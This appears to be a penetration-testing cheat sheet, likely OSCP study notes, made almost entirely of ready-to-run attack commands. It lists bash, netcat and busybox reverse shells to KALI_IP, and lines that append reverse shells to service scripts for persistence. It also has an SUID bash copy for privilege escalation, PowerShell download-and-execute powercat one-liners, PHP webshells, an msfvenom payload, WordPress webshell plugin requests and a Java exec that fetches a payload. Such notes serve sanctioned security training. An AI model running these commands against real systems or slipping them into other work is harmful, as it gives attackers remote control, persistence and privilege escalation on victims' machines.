# *Linux*
### bash reverse
```shell
/bin/bash -c "bash -i >& /dev/tcp/KALI_IP/LPORT 0>&1"
```
### busybox reverse
```shell
busybox nc KALI_IP 443 -e sh

# https://eins.li/posts/oscp-secret-sauce/
```
### nc
```shell
/path/nc KALI_IP LPORT -e /bin/bash
```
## .sh script reverse
```shell
# bash
echo "bash -i >& /dev/tcp/KALI_IP/443 0>&" >> /path/to/service.sh
chmod +x /path/to/service.sh

# nc
echo >> reverse.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc KALI_IP 443 >/tmp/f" >> /path/to/service.sh
chmod +x /path/to/service.sh
```
## copy bash w/ suid
```shell
cp /bin/bash /tmp && chmod +s /tmp/bash
```

# ***Windows***
## powershell encoded
```shell
# 1 KALI
python3 ps_encode.py

# 2 TARGET
powershell.exe -nop -w hidden -enc encoded_payload...
```
## powercat encoded
```shell
# 1 KALI
python3 cat_encode.py

# 2 TARGET
powershell.exe -nop -w hidden -enc encoded_payload...
```
## powercat manually typed
```shell
# 1 payload
IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell

# 2 use as follows
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell"
```
## nc.exe
```shell
C:\PATH\nc.exe KALI_IP LPORT -e powershell
```

# ***Web***
## php
### bash reverse
```php
<?php exec("/bin/bash -c bash -i >& /dev/tcp/KALI_IP/443 0>&1"); ?>
```
### simple webshell
```php
<?php echo system($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
```
### simple webshell 2
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
    }
?>
# located at /usr/share/webshells/php/simple-backdoor.php
```
### sincek reverse
```shell
# https://github.com/ivan-sincek/php-reverse-shell
```
### msfvenom
```shell
msfvenom -p php/reverse_php LHOST=`mip` LPORT=443 -f raw > reverse.php
```
### wordpress plugin
```shell
# POST
curl -X POST `tip`:`WPORT`/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php --data 'action=exec&cmd=id'

# GET (or use browser)
curl `tip`:`WPORT`/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id

# https://github.com/p0dalirius/Wordpress-webshell-plugin
```
### wordpress plugin 2
```shell
https://github.com/wetw0rk/malicious-wordpress-plugin
```
## asp
### webshell
```shell
https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell
```

## java
### runtime exec
```shell
${script:javascript:java.lang.Runtime.getRuntime().exec("wget http://KALI_IP/reverse -O /tmp/reverse")}
```

# ***upgrade shell***
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^z

stty raw -echo;fg
```